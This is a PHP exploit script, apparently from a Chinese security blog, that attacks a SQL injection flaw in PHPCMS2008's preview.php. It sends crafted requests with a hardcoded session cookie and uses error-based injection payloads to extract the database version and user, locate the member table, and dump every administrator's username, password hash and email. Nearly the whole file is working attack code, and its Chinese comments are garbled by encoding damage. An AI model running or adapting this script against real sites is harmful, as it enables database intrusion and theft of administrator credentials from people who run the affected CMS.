<?php
/**
 * Created by Եȴ
 * Date: 13-11-24
 * Time: 8:36
 * Name: phpcms2008_preview.php
 * Եȴͣhttp://www.waitalone.cn/
 */
print_r('
+------------------------------------------------------+
             PHPCMS2008 preview.php עEXP
             Sitehttp://www.waitalone.cn/
                Exploit BY Եȴ
                  Time2013-11-24
+------------------------------------------------------+
');
if ($argc < 3) {
    print_r('
+------------------------------------------------------+
Useage: php ' . $argv[0] . ' host path
Host: target server (ip/hostname)
Path: path of phpcms
Example: php ' . $argv[0] . ' localhost /phpcms
+------------------------------------------------------+
    ');
    exit;
}
error_reporting(7);
//ͳʱ
$start_time = func_time();
$host = $argv[1];
$path = $argv[2];
$cookie = 'PHPSESSID=paie8nva343mi2ivjfl8pemqq3; vsLCNPLglFauth=56c8VgQGVgkJAggBU10HDwVSDVQAVFsBUFEBXQIOAGpSDAJQAwcFDw9TXVcGWQUKBAFbVFsHDlMHBVQBAglWAQ; vsLCNPLglFcookietime=86400; vsLCNPLglFusername=testtest; vsLCNPLglFattachments[1114]=2014%2F1202%2F20141202030305840.jpg; vsLCNPLglFattachments[1116]=2014%2F1202%2F20141202031032159.jpg; vsLCNPLglFattachments[1117]=2014%2F1202%2F20141202031839261.jpg; vsLCNPLglFattachments[1118]=2014%2F1202%2F20141202032446660.jpg'; //ѻԱcookieд˱
if ($cookie == '') exit('עԱдcookiecookieС');
if (preg_match('/MySQL Query/i', send_pack("'"))) {
    //ݿ汾
    $db_ver = "'and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#";
    echo 'ݿ汾' . get_info($db_ver) . "\n";
    //ݿû
    $db_user = "'and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#";
    echo 'ݿû' . get_info($db_user) . "\n";
    //ȡû
    $db_member = "' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() and table_name like '%_member%' LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#";
    $member = get_info($db_member);
    //ȡԱ
    $db_count = "' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,count(*),0x7e) FROM $member where groupid=1 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#";
    $ad_count = get_info($db_count);
    echo 'Աй--[' . $ad_count . ']--Ա' . "\n";
    //ʾע
    foreach (range(0, ($ad_count - 1)) as $i) {
        $ad_pass = "' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,username,0x3a,password,0x3a,email,0x7e) FROM $member where groupid=1 LIMIT $i,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#";
        echo 'Ա[' . ($i + 1) . ']-->' . get_info($ad_pass) . "\n";
    }
} else {
    exit("ˣվڴ©,Լһ!\n");
}
 
//ȡϢ
function get_info($info)
{
    preg_match('/~(.*?)~1/i', send_pack($info), $match_string);
    if (preg_match('/charset=utf-8/i', send_pack($info))) {
        return iconv('utf-8', 'gbk//IGNORE', $match_string[1]);
    } else {
        return $match_string[1];
    }
}
 
//ݰ
function send_pack($cmd)
{
    global $host, $path, $cookie;
    $data = "GET " . $path . "/preview.php?info[catid]=15&content=a[page]b&info[contentid]=2" . urlencode($cmd) . " HTTP/1.1\r\n";
    $data .= "Host: " . $host . "\r\n";
    $data .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0\r\n";
    $data .= "Cookie:" . $cookie . "\r\n";
    $data .= "Connection: Close\r\n\r\n";
    //echo $data;
    //һҪ2\r\n򽫻һֱȴҲ
    $fp = @fsockopen($host, 80, $errno, $errstr, 30);
    //echo ini_get('default_socket_timeout');//ĬϳʱʱΪ60
    if (!$fp) {
        echo $errno . '-->' . $errstr;
        exit('Could not connect to: ' . $host);
    } else {
        fwrite($fp, $data);
        $back = '';
        while (!feof($fp)) {
            $back .= fread($fp, 1024);
        }
        fclose($fp);
    }
    return $back;
}
 
//ʱͳƺ
function func_time()
{
    list($microsec, $sec) = explode(' ', microtime());
    return $microsec + $sec;
}
 
echo 'űִʱ䣺' . round((func_time() - $start_time), 4) . '롣';
?>